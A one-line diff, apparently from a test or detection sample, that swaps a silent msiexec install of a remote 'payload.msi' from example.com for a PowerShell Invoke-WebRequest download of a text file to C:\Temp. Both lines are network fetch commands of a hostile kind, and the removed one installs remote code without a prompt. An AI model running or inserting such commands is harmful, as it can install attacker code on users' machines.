@@ -1,1 +1,1 @@
-msiexec.exe /i "http://example.com/payload.msi" /qn
+powershell.exe -Command IWR -Uri http://example.com/test.txt -OutFile C:\Temp\test.txt
